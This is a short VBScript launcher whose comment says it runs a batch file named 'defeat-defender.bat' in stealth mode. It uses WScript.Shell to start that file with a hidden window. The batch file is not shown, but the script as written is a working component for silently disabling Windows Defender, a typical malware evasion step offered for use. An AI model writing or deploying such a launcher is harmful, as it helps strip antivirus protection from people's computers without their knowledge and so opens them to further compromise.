' This use to run a defeat-defender.bat file in stealth mode.

Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "defeat-defender.bat" & Chr(34), 0
Set WinScriptHost = Nothing
